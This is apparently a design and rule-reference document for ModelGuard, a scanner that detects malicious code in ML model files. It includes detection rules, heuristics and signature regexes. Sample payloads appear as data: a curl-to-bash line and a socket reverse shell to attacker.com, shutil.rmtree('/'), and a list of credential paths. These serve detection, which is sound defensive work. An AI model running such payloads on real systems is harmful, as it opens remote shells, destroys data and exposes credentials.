# ModelGuard Skills.md
## Detection Capabilities & Rule Reference

**Version:** 1.0.0  
**Build Target:** Weekend MVP

---

## Overview

This document defines all detection skills, rules, patterns, and capabilities that ModelGuard uses to identify threats in ML model files. It serves as both implementation reference and user documentation.

---

## Skill Categories

```
┌─────────────────────────────────────────────────────────────────┐
│                    ModelGuard Detection Skills                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │    Code      │  │   Network    │  │    File      │          │
│  │  Execution   │  │   Activity   │  │   System     │          │
│  │   Skills     │  │   Skills     │  │   Skills     │          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │  Obfuscation │  │   Known      │  │   Format     │          │
│  │  Detection   │  │   Malware    │  │  Validation  │          │
│  │   Skills     │  │   Skills     │  │   Skills     │          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Skill 1: Code Execution Detection

**Purpose:** Detect arbitrary code execution payloads in model files.

### Detection Patterns

| Rule ID | Pattern | Severity | Description |
|---------|---------|----------|-------------|
| MG001 | `os.system` | Critical | System shell command execution |
| MG002 | `os.popen` | Critical | Piped command execution |
| MG003 | `subprocess.call` | Critical | Subprocess execution |
| MG004 | `subprocess.Popen` | Critical | Subprocess with full control |
| MG005 | `subprocess.run` | Critical | Modern subprocess execution |
| MG006 | `subprocess.check_output` | Critical | Subprocess with output capture |
| MG007 | `builtins.eval` | Critical | Arbitrary Python evaluation |
| MG008 | `builtins.exec` | Critical | Arbitrary Python execution |
| MG009 | `builtins.compile` | Critical | Dynamic code compilation |
| MG010 | `commands.getoutput` | Critical | Legacy shell execution |
| MG011 | `commands.getstatusoutput` | Critical | Legacy shell execution |
| MG012 | `pty.spawn` | Critical | PTY spawn (interactive shell) |
| MG013 | `os.execv` | Critical | Process replacement |
| MG014 | `os.execve` | Critical | Process replacement with env |
| MG015 | `os.spawnl` | Critical | Process spawning |

### Implementation

```python
# rules/code_execution.py

CODE_EXECUTION_RULES = [
    {
        'id': 'MG001',
        'pattern': 'os.system',
        'severity': 'critical',
        'category': 'CODE_EXECUTION',
        'title': 'System Command Execution',
        'description': 'Executes shell commands with full system access',
        'remediation': 'Remove os.system call. Use SafeTensors format.',
        'references': [
            'https://docs.python.org/3/library/os.html#os.system',
            'https://cwe.mitre.org/data/definitions/78.html'
        ],
        'examples': {
            'malicious': 'os.system("curl attacker.com/shell.sh | bash")',
            'detection': 'GLOBAL opcode with os.system callable'
        }
    },
    {
        'id': 'MG002',
        'pattern': 'os.popen',
        'severity': 'critical',
        'category': 'CODE_EXECUTION',
        'title': 'Piped Command Execution',
        'description': 'Opens a pipe to/from a shell command',
        'remediation': 'Remove os.popen call. Use SafeTensors format.',
        'references': [
            'https://docs.python.org/3/library/os.html#os.popen'
        ]
    },
    {
        'id': 'MG003',
        'pattern': 'subprocess.call',
        'severity': 'critical',
        'category': 'CODE_EXECUTION',
        'title': 'Subprocess Call',
        'description': 'Executes a command in a subprocess',
        'remediation': 'Remove subprocess call. Use SafeTensors format.',
        'references': [
            'https://docs.python.org/3/library/subprocess.html'
        ]
    },
    {
        'id': 'MG004',
        'pattern': 'subprocess.Popen',
        'severity': 'critical',
        'category': 'CODE_EXECUTION',
        'title': 'Subprocess Popen',
        'description': 'Creates subprocess with full I/O control',
        'remediation': 'Remove subprocess.Popen. Use SafeTensors format.',
        'cve': None,
        'mitre_attack': 'T1059.006'
    },
    {
        'id': 'MG007',
        'pattern': 'builtins.eval',
        'severity': 'critical',
        'category': 'CODE_EXECUTION',
        'title': 'Eval Execution',
        'description': 'Evaluates arbitrary Python expressions',
        'remediation': 'Remove eval. Never use eval with untrusted input.',
        'references': [
            'https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html'
        ]
    },
    {
        'id': 'MG008',
        'pattern': 'builtins.exec',
        'severity': 'critical',
        'category': 'CODE_EXECUTION',
        'title': 'Exec Execution',
        'description': 'Executes arbitrary Python code',
        'remediation': 'Remove exec. Never use exec with untrusted input.',
    }
]
```

### Detection Logic

```python
def detect_code_execution(pickle_opcodes: list) -> list:
    """
    Detect code execution patterns in pickle opcodes.
    
    Args:
        pickle_opcodes: List of (opcode, arg, pos) tuples from pickletools.genops()
    
    Returns:
        List of Finding objects for detected threats
    """
    findings = []
    
    for opcode, arg, pos in pickle_opcodes:
        if opcode.name == 'GLOBAL':
            # GLOBAL opcode imports a module.function
            module_func = normalize_global(arg)
            
            for rule in CODE_EXECUTION_RULES:
                if rule['pattern'] in module_func:
                    findings.append(Finding(
                        rule_id=rule['id'],
                        category=rule['category'],
                        severity=rule['severity'],
                        title=rule['title'],
                        description=rule['description'],
                        pattern=module_func,
                        location=f'Byte offset: {pos}',
                        remediation=rule['remediation'],
                        references=rule.get('references', [])
                    ))
        
        elif opcode.name == 'REDUCE':
            # REDUCE calls a callable - flag for review if callable is suspicious
            pass  # Handled by fickling's more sophisticated analysis
    
    return findings
```

---

## Skill 2: Network Activity Detection

**Purpose:** Detect network communication capabilities that could be used for data exfiltration or reverse shells.

### Detection Patterns

| Rule ID | Pattern | Severity | Description |
|---------|---------|----------|-------------|
| MG020 | `socket.socket` | Critical | Raw socket creation |
| MG021 | `socket.create_connection` | Critical | Outbound TCP connection |
| MG022 | `urllib.request.urlopen` | High | HTTP request |
| MG023 | `urllib.request.urlretrieve` | High | File download |
| MG024 | `requests.get` | High | HTTP GET request |
| MG025 | `requests.post` | High | HTTP POST request |
| MG026 | `http.client.HTTPConnection` | High | HTTP connection |
| MG027 | `ftplib.FTP` | High | FTP connection |
| MG028 | `smtplib.SMTP` | High | Email sending |
| MG029 | `telnetlib.Telnet` | Critical | Telnet connection |
| MG030 | `paramiko.SSHClient` | Critical | SSH connection |

### Reverse Shell Detection

```python
# rules/network.py

REVERSE_SHELL_PATTERNS = [
    {
        'id': 'MG020',
        'pattern': 'socket.socket',
        'severity': 'critical',
        'category': 'REVERSE_SHELL',
        'title': 'Raw Socket Creation',
        'description': 'Creates raw network socket - common in reverse shells',
        'indicators': [
            'Combined with socket.connect()',
            'Followed by os.dup2()',
            'subprocess.call(["/bin/sh"])',
        ],
        'remediation': 'Do not load this file. Investigate source.',
        'example_payload': '''
import socket
import subprocess
s = socket.socket()
s.connect(("attacker.com", 4444))
subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
'''
    },
    {
        'id': 'MG021',
        'pattern': 'socket.create_connection',
        'severity': 'critical',
        'category': 'REVERSE_SHELL',
        'title': 'Outbound Connection',
        'description': 'Establishes outbound TCP connection',
        'remediation': 'Do not load. Verify no unauthorized network access.'
    }
]

DATA_EXFILTRATION_PATTERNS = [
    {
        'id': 'MG022',
        'pattern': 'urllib.request.urlopen',
        'severity': 'high',
        'category': 'NETWORK',
        'title': 'URL Request',
        'description': 'Can download malicious payloads or exfiltrate data',
        'remediation': 'Verify any network access is intentional and authorized'
    },
    {
        'id': 'MG024',
        'pattern': 'requests.get',
        'severity': 'high',
        'category': 'NETWORK',
        'title': 'HTTP GET Request',
        'description': 'HTTP library can download payloads or exfiltrate data',
        'remediation': 'Verify network access is authorized'
    }
]
```

### Network Heuristics

```python
def detect_reverse_shell_heuristics(opcodes: list) -> list:
    """
    Use heuristics to detect likely reverse shell patterns.
    
    A reverse shell typically has:
    1. socket.socket()
    2. socket.connect() to external host
    3. os.dup2() to redirect stdin/stdout
    4. subprocess/os.system to spawn shell
    """
    findings = []
    
    has_socket = False
    has_dup2 = False
    has_shell = False
    
    for opcode, arg, pos in opcodes:
        if opcode.name == 'GLOBAL':
            module_func = str(arg)
            
            if 'socket.socket' in module_func:
                has_socket = True
            if 'os.dup2' in module_func:
                has_dup2 = True
            if any(x in module_func for x in ['subprocess', 'os.system', '/bin/sh', '/bin/bash']):
                has_shell = True
    
    # Heuristic: socket + dup2 + shell = reverse shell
    if has_socket and has_dup2 and has_shell:
        findings.append(Finding(
            rule_id='MG_REVERSE_SHELL_HEURISTIC',
            category='REVERSE_SHELL',
            severity='critical',
            title='Likely Reverse Shell Pattern',
            description='Combination of socket, dup2, and shell execution detected',
            remediation='DO NOT LOAD. This file contains a reverse shell payload.',
            references=['https://www.revshells.com/']
        ))
    
    # Heuristic: socket + shell (without dup2) = possible reverse shell
    elif has_socket and has_shell:
        findings.append(Finding(
            rule_id='MG_POSSIBLE_REVERSE_SHELL',
            category='REVERSE_SHELL',
            severity='critical',
            title='Possible Reverse Shell',
            description='Socket and shell execution detected together',
            remediation='Manual review required. High risk of malicious payload.'
        ))
    
    return findings
```

---

## Skill 3: File System Operation Detection

**Purpose:** Detect file system operations that could read sensitive data, write malicious files, or delete/corrupt data.

### Detection Patterns

| Rule ID | Pattern | Severity | Description |
|---------|---------|----------|-------------|
| MG040 | `builtins.open` | Medium | File open operation |
| MG041 | `io.open` | Medium | File open operation |
| MG042 | `os.remove` | High | File deletion |
| MG043 | `os.unlink` | High | File deletion |
| MG044 | `os.rmdir` | High | Directory deletion |
| MG045 | `shutil.rmtree` | Critical | Recursive deletion |
| MG046 | `os.rename` | High | File rename/move |
| MG047 | `shutil.move` | High | File move |
| MG048 | `os.chmod` | High | Permission change |
| MG049 | `os.chown` | High | Ownership change |
| MG050 | `os.makedirs` | Medium | Directory creation |
| MG051 | `shutil.copy` | Medium | File copy |
| MG052 | `pathlib.Path.write_text` | Medium | File write |
| MG053 | `pathlib.Path.unlink` | High | File deletion |

### Implementation

```python
# rules/filesystem.py

FILESYSTEM_RULES = [
    {
        'id': 'MG040',
        'pattern': 'builtins.open',
        'severity': 'medium',
        'category': 'FILE_SYSTEM',
        'title': 'File Open Operation',
        'description': 'Can read or write arbitrary files',
        'context': 'Risk depends on mode: "r" lower risk, "w" higher risk',
        'remediation': 'Verify file operations are expected and sandboxed'
    },
    {
        'id': 'MG042',
        'pattern': 'os.remove',
        'severity': 'high',
        'category': 'FILE_SYSTEM',
        'title': 'File Deletion',
        'description': 'Can delete arbitrary files',
        'remediation': 'Do not load without reviewing what files may be deleted'
    },
    {
        'id': 'MG045',
        'pattern': 'shutil.rmtree',
        'severity': 'critical',
        'category': 'FILE_SYSTEM',
        'title': 'Recursive Directory Deletion',
        'description': 'Can delete entire directory trees including system files',
        'remediation': 'HIGH RISK. Manual review required.',
        'example_payload': 'shutil.rmtree("/") # Deletes everything'
    },
    {
        'id': 'MG048',
        'pattern': 'os.chmod',
        'severity': 'high',
        'category': 'FILE_SYSTEM',
        'title': 'Permission Modification',
        'description': 'Can change file permissions, potentially making files executable',
        'remediation': 'Review for privilege escalation attempts'
    }
]

# Sensitive file paths that increase severity
SENSITIVE_PATHS = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/sudoers',
    '~/.ssh/',
    '~/.aws/',
    '~/.config/',
    '/root/',
    'C:\\Windows\\System32',
    'C:\\Users\\',
]

def check_sensitive_paths(code_context: str) -> bool:
    """Check if code references sensitive file paths"""
    for path in SENSITIVE_PATHS:
        if path in code_context:
            return True
    return False
```

---

## Skill 4: Dangerous Import Detection

**Purpose:** Detect imports of dangerous modules that provide system access capabilities.

### Detection Patterns

| Rule ID | Pattern | Severity | Description |
|---------|---------|----------|-------------|
| MG060 | `importlib.import_module` | High | Dynamic module import |
| MG061 | `__import__` | High | Built-in import function |
| MG062 | `imp.load_module` | High | Legacy module loading |
| MG063 | `runpy.run_module` | High | Module execution |
| MG064 | `runpy.run_path` | High | Path execution |
| MG065 | `ctypes.CDLL` | High | C library loading |
| MG066 | `ctypes.cdll` | High | C library loading |
| MG067 | `ctypes.windll` | High | Windows DLL loading |
| MG068 | `cffi.FFI` | High | Foreign function interface |
| MG069 | `importlib.util.spec_from_loader` | Medium | Custom module loading |

### Implementation

```python
# rules/imports.py

DANGEROUS_IMPORT_RULES = [
    {
        'id': 'MG060',
        'pattern': 'importlib.import_module',
        'severity': 'high',
        'category': 'DANGEROUS_IMPORT',
        'title': 'Dynamic Module Import',
        'description': 'Can import arbitrary modules at runtime',
        'attack_scenario': 'Attacker imports os module to gain system access',
        'remediation': 'Verify imported modules are safe'
    },
    {
        'id': 'MG061',
        'pattern': '__import__',
        'severity': 'high',
        'category': 'DANGEROUS_IMPORT',
        'title': 'Built-in Import',
        'description': 'Direct use of import machinery',
        'remediation': 'Review what modules are being imported'
    },
    {
        'id': 'MG065',
        'pattern': 'ctypes.CDLL',
        'severity': 'high',
        'category': 'DANGEROUS_IMPORT',
        'title': 'C Library Loading',
        'description': 'Can load and execute arbitrary C code',
        'attack_scenario': 'Load malicious .so/.dll for native code execution',
        'remediation': 'Do not load. Native code execution risk.'
    },
    {
        'id': 'MG067',
        'pattern': 'ctypes.windll',
        'severity': 'high',
        'category': 'DANGEROUS_IMPORT',
        'title': 'Windows DLL Loading',
        'description': 'Can load Windows DLLs for native code execution',
        'platform': 'windows',
        'remediation': 'Do not load on Windows systems'
    }
]

# Modules that should never appear in ML model files
BLOCKLISTED_MODULES = [
    'ctypes',
    'cffi',
    'win32api',
    'win32con',
    'winreg',
    'mmap',
    'multiprocessing',  # Can spawn processes
    'threading',        # Can spawn threads
    'concurrent.futures',
    'asyncio',         # Async execution
]
```

---

## Skill 5: Obfuscation Detection

**Purpose:** Detect attempts to hide malicious code through encoding, encryption, or compression.

### Detection Patterns

| Rule ID | Pattern | Severity | Description |
|---------|---------|----------|-------------|
| MG080 | `base64.b64decode` | Medium | Base64 decoding |
| MG081 | `codecs.decode` | Medium | Codec decoding |
| MG082 | `zlib.decompress` | Medium | Zlib decompression |
| MG083 | `gzip.decompress` | Medium | Gzip decompression |
| MG084 | `bz2.decompress` | Medium | Bzip2 decompression |
| MG085 | `lzma.decompress` | Medium | LZMA decompression |
| MG086 | `marshal.loads` | High | Marshal deserialization |
| MG087 | `pickle.loads` | High | Nested pickle |
| MG088 | `binascii.unhexlify` | Medium | Hex decoding |
| MG089 | `ast.literal_eval` | Medium | Literal evaluation |

### Obfuscation Heuristics

```python
# rules/obfuscation.py

OBFUSCATION_RULES = [
    {
        'id': 'MG080',
        'pattern': 'base64.b64decode',
        'severity': 'medium',
        'category': 'OBFUSCATION',
        'title': 'Base64 Decoding',
        'description': 'Can decode hidden payloads',
        'heuristic': 'Higher risk if combined with exec/eval',
        'remediation': 'Decode and inspect the payload manually'
    },
    {
        'id': 'MG086',
        'pattern': 'marshal.loads',
        'severity': 'high',
        'category': 'OBFUSCATION',
        'title': 'Marshal Deserialization',
        'description': 'Deserializes Python bytecode - can execute arbitrary code',
        'attack_scenario': 'Attacker hides malicious bytecode in marshal format',
        'remediation': 'HIGH RISK. Do not load without expert review.'
    },
    {
        'id': 'MG087',
        'pattern': 'pickle.loads',
        'severity': 'high',
        'category': 'OBFUSCATION',
        'title': 'Nested Pickle',
        'description': 'Pickle within pickle - may bypass scanners',
        'attack_scenario': 'Outer pickle unpacks and loads inner malicious pickle',
        'remediation': 'Recursive analysis required'
    }
]

def detect_obfuscation_chain(opcodes: list) -> list:
    """
    Detect obfuscation chains like: base64.b64decode -> exec
    These are common patterns for hiding malicious code.
    """
    findings = []
    
    decode_ops = set()
    exec_ops = set()
    
    for opcode, arg, pos in opcodes:
        if opcode.name == 'GLOBAL':
            module_func = str(arg)
            
            # Track decode operations
            if any(x in module_func for x in ['b64decode', 'decompress', 'unhexlify', 'marshal.loads']):
                decode_ops.add(module_func)
            
            # Track execution operations
            if any(x in module_func for x in ['exec', 'eval', 'compile']):
                exec_ops.add(module_func)
    
    # If we have both decode and exec, flag as obfuscation chain
    if decode_ops and exec_ops:
        findings.append(Finding(
            rule_id='MG_OBFUSCATION_CHAIN',
            category='OBFUSCATION',
            severity='critical',
            title='Obfuscation Chain Detected',
            description=f'Decode operations ({decode_ops}) combined with execution ({exec_ops})',
            remediation='CRITICAL: This is a common malware pattern. Do not load.',
            references=['https://attack.mitre.org/techniques/T1027/']
        ))
    
    return findings
```

---

## Skill 6: Known Malware Detection

**Purpose:** Detect known malicious model files by hash or signature.

### Hash Database

```python
# rules/known_malware.py

# Known malicious model hashes (SHA256)
# Source: JFrog research, community reports
KNOWN_MALICIOUS_HASHES = {
    # Example entries - would be populated from threat intelligence
    'abc123...': {
        'name': 'JFrog-2024-001',
        'description': 'Reverse shell payload targeting Linux',
        'source': 'JFrog Malicious ML Models Report 2024',
        'date_added': '2024-03-15'
    },
    'def456...': {
        'name': 'HF-Malicious-001',
        'description': 'Crypto miner payload',
        'source': 'Hugging Face Security Report',
        'date_added': '2024-06-20'
    }
}

# Known malicious patterns (signatures)
MALWARE_SIGNATURES = [
    {
        'id': 'SIG001',
        'name': 'Generic Reverse Shell',
        'pattern': b'socket.*connect.*dup2.*bin/sh',
        'type': 'regex',
        'severity': 'critical'
    },
    {
        'id': 'SIG002', 
        'name': 'Crypto Miner',
        'pattern': b'stratum+tcp://|xmrig|minerd',
        'type': 'regex',
        'severity': 'critical'
    },
    {
        'id': 'SIG003',
        'name': 'Data Exfiltration',
        'pattern': b'requests.post.*password|curl.*--data.*token',
        'type': 'regex',
        'severity': 'high'
    }
]

def check_known_malware(file_hash: str, file_content: bytes) -> list:
    """Check file against known malware database"""
    findings = []
    
    # Check hash database
    if file_hash in KNOWN_MALICIOUS_HASHES:
        info = KNOWN_MALICIOUS_HASHES[file_hash]
        findings.append(Finding(
            rule_id='MG_KNOWN_MALWARE',
            category='KNOWN_MALWARE',
            severity='critical',
            title=f'Known Malicious File: {info["name"]}',
            description=info['description'],
            pattern=f'SHA256: {file_hash}',
            remediation='DELETE IMMEDIATELY. Do not load.',
            references=[info['source']]
        ))
    
    # Check signatures
    import re
    for sig in MALWARE_SIGNATURES:
        if sig['type'] == 'regex':
            if re.search(sig['pattern'], file_content, re.IGNORECASE | re.DOTALL):
                findings.append(Finding(
                    rule_id=f'MG_{sig["id"]}',
                    category='KNOWN_MALWARE',
                    severity=sig['severity'],
                    title=f'Malware Signature: {sig["name"]}',
                    description=f'Matched signature pattern',
                    remediation='Do not load. Known malware pattern.'
                ))
    
    return findings
```

---

## Skill 7: Format Validation

**Purpose:** Validate model file format integrity and detect structural anomalies.

### Validation Checks

| Rule ID | Check | Severity | Description |
|---------|-------|----------|-------------|
| MG100 | Magic bytes | Medium | Verify file starts with expected magic |
| MG101 | Structure | Medium | Validate internal structure |
| MG102 | Size limits | Low | Check for oversized headers/sections |
| MG103 | Nested archives | Medium | Detect excessive nesting |
| MG104 | Encoding | Low | Verify expected encoding |

### Implementation

```python
# rules/format_validation.py

FORMAT_SIGNATURES = {
    'pickle': {
        'magic': [b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05'],
        'legacy_start': [b'(', b']', b'}', b'c'],
    },
    'pytorch_zip': {
        'magic': [b'PK\x03\x04'],  # ZIP signature
        'required_files': ['data.pkl', 'version'],
    },
    'hdf5': {
        'magic': [b'\x89HDF\r\n\x1a\n'],
    },
    'onnx': {
        'magic': [b'\x08'],  # Protobuf
    },
    'safetensors': {
        'header_format': 'json',
        'max_header_size': 100 * 1024 * 1024,  # 100MB
    }
}

def validate_format(file_path: str, expected_format: str) -> list:
    """Validate file format integrity"""
    findings = []
    
    with open(file_path, 'rb') as f:
        header = f.read(1024)
    
    format_spec = FORMAT_SIGNATURES.get(expected_format)
    if not format_spec:
        return findings
    
    # Check magic bytes
    if 'magic' in format_spec:
        magic_matched = any(header.startswith(m) for m in format_spec['magic'])
        if not magic_matched:
            # Check legacy formats
            if 'legacy_start' in format_spec:
                magic_matched = any(header[0:1] == m for m in format_spec['legacy_start'])
        
        if not magic_matched:
            findings.append(Finding(
                rule_id='MG100',
                category='SUSPICIOUS_STRUCTURE',
                severity='medium',
                title='Invalid Magic Bytes',
                description=f'File does not match expected {expected_format} format',
                remediation='File may be corrupt or misnamed'
            ))
    
    return findings

def detect_zip_bomb(file_path: str) -> list:
    """Detect zip bomb (decompression bomb) attempts"""
    findings = []
    
    import zipfile
    try:
        with zipfile.ZipFile(file_path, 'r') as zf:
            total_uncompressed = sum(info.file_size for info in zf.infolist())
            compressed_size = os.path.getsize(file_path)
            
            # Compression ratio > 100:1 is suspicious
            if compressed_size > 0 and total_uncompressed / compressed_size > 100:
                findings.append(Finding(
                    rule_id='MG_ZIP_BOMB',
                    category='SUSPICIOUS_STRUCTURE',
                    severity='high',
                    title='Potential Zip Bomb',
                    description=f'Compression ratio: {total_uncompressed/compressed_size:.0f}:1',
                    remediation='Do not extract. May exhaust disk space.'
                ))
            
            # Check for deeply nested archives
            for name in zf.namelist():
                if name.endswith('.zip') or name.endswith('.tar.gz'):
                    findings.append(Finding(
                        rule_id='MG_NESTED_ARCHIVE',
                        category='SUSPICIOUS_STRUCTURE',
                        severity='medium',
                        title='Nested Archive',
                        description=f'Archive within archive: {name}',
                        remediation='Extract and scan nested archive'
                    ))
                    
    except zipfile.BadZipFile:
        pass  # Not a zip file
    
    return findings
```

---

## Skill 8: CVE Detection

**Purpose:** Detect known vulnerabilities (CVEs) in model file handling.

### Known CVEs

| CVE | Severity | Description | Affected |
|-----|----------|-------------|----------|
| CVE-2024-5480 | Critical | PyTorch Distributed RPC RCE | PyTorch <2.3.0 |
| CVE-2024-3660 | High | Keras safe_mode bypass | Keras <3.0.0 |
| CVE-2023-6730 | High | Transformers transitive attack | transformers |
| CVE-2025-1716 | High | picklescan bypass | picklescan <0.1.0 |

### Implementation

```python
# rules/cve_detection.py

CVE_DATABASE = [
    {
        'cve': 'CVE-2024-5480',
        'severity': 'critical',
        'title': 'PyTorch Distributed RPC RCE',
        'description': 'Remote code execution via PyTorch Distributed RPC',
        'affected_patterns': ['torch.distributed.rpc'],
        'affected_versions': 'PyTorch < 2.3.0',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2024-5480']
    },
    {
        'cve': 'CVE-2024-3660',
        'severity': 'high',
        'title': 'Keras safe_mode Bypass',
        'description': 'Bypass of Keras safe_mode allows arbitrary code execution',
        'affected_patterns': ['keras.models.load_model'],
        'affected_versions': 'Keras < 3.0.0',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2024-3660']
    },
    {
        'cve': 'CVE-2025-1716',
        'severity': 'high',
        'title': 'picklescan Bypass',
        'description': 'Multiple bypasses in picklescan security scanner',
        'affected_patterns': ['__reduce_ex__', 'persistent_id'],
        'affected_versions': 'picklescan < 0.1.0',
        'references': ['https://blog.sonatype.com/picklescan-bypass']
    }
]

def check_cve_patterns(opcodes: list, metadata: dict) -> list:
    """Check for patterns associated with known CVEs"""
    findings = []
    
    for cve in CVE_DATABASE:
        for pattern in cve['affected_patterns']:
            for opcode, arg, pos in opcodes:
                if opcode.name == 'GLOBAL' and pattern in str(arg):
                    findings.append(Finding(
                        rule_id=f'MG_{cve["cve"]}',
                        category='CVE_VULNERABLE',
                        severity=cve['severity'],
                        title=f'{cve["cve"]}: {cve["title"]}',
                        description=cve['description'],
                        pattern=pattern,
                        location=f'Byte offset: {pos}',
                        remediation=f'Affected versions: {cve["affected_versions"]}',
                        references=cve['references']
                    ))
    
    return findings
```

---

## Rule Configuration

### Default Rules File

```yaml
# rules/default.yml

version: 1
name: ModelGuard Default Rules
description: Default rule set for ML model security scanning

# Global settings
settings:
  severity_threshold: medium  # Minimum severity to report
  max_findings_per_file: 100
  timeout_seconds: 60

# Rule categories to enable
categories:
  code_execution: true
  network: true
  file_system: true
  dangerous_import: true
  obfuscation: true
  known_malware: true
  format_validation: true
  cve_detection: true

# Individual rule overrides
rules:
  # Disable specific rules
  MG040:  # builtins.open
    enabled: true
    severity: low  # Downgrade from medium

  # Add custom patterns
  CUSTOM001:
    enabled: true
    pattern: "company_internal_module"
    severity: info
    category: CUSTOM
    title: "Internal Module Reference"
    description: "References internal company module"

# Allowlist by pattern (regex)
allowlist_patterns:
  - "torch\\.nn\\..*"  # Allow PyTorch nn modules
  - "tensorflow\\..*"   # Allow TensorFlow modules
  - "transformers\\..*" # Allow Hugging Face transformers
```

---

## Severity Levels

| Level | Description | Action |
|-------|-------------|--------|
| **Critical** | Active exploitation possible, immediate threat | Block, alert |
| **High** | Significant risk, likely malicious | Block, review |
| **Medium** | Moderate risk, may be legitimate | Warn, review |
| **Low** | Low risk, likely benign | Info only |
| **Info** | Informational, no action needed | Log only |

### Severity Assignment Logic

```python
def calculate_severity(findings: list) -> str:
    """
    Calculate overall severity from findings.
    Uses highest severity found.
    """
    severity_order = ['critical', 'high', 'medium', 'low', 'info']
    
    highest = 'info'
    for finding in findings:
        finding_severity = finding.get('severity', 'info')
        if severity_order.index(finding_severity) < severity_order.index(highest):
            highest = finding_severity
    
    return highest

def should_fail(findings: list, threshold: str) -> bool:
    """
    Determine if scan should fail based on threshold.
    
    threshold: 'critical', 'high', 'medium', 'low', 'none'
    """
    if threshold == 'none':
        return False
    
    severity_order = ['critical', 'high', 'medium', 'low']
    threshold_index = severity_order.index(threshold)
    
    for finding in findings:
        finding_severity = finding.get('severity', 'info')
        if finding_severity in severity_order:
            if severity_order.index(finding_severity) <= threshold_index:
                return True
    
    return False
```

---

## Summary: Detection Coverage

| Threat Type | Rules | Coverage |
|-------------|-------|----------|
| Code Execution | 15 | High |
| Network/Reverse Shell | 12 | High |
| File System | 14 | Medium |
| Dangerous Imports | 10 | Medium |
| Obfuscation | 10 | Medium |
| Known Malware | Hash + Sig | Growing |
| Format Validation | 5 | Basic |
| CVE Detection | 4 | Growing |

**Total Rules:** 70+ detection patterns

### Coverage Gaps (Future Work)

1. **Keras Lambda bytecode analysis** - Currently only pattern matching
2. **ONNX custom operator validation** - Limited to domain checking
3. **Dynamic analysis / sandboxing** - Static analysis only
4. **Model watermark detection** - Not yet implemented
5. **Training data poisoning** - Out of scope (requires training data)